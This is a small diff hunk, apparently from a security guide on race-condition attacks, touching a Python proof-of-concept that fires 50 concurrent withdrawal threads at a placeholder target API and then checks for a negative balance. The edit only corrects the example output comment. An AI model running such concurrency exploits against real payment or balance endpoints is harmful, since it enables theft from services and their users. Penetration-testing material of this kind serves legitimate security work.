@@ -47,7 +47,7 @@ threads = [threading.Thread(target=withdraw) for _ in range(50)]
 
 # Check balance -- likely negative or multiple successful withdrawals
 r = requests.get("http://target/api/balance", headers={"Authorization": "Bearer X"})
-print(r.json())  # e.g., balance: -4900, 5 successful withdrawals
+print(r.json())  # e.g., balance: -400, 5 successful withdrawals of $100 each
 ```
 
 ### Coupon Double-Use
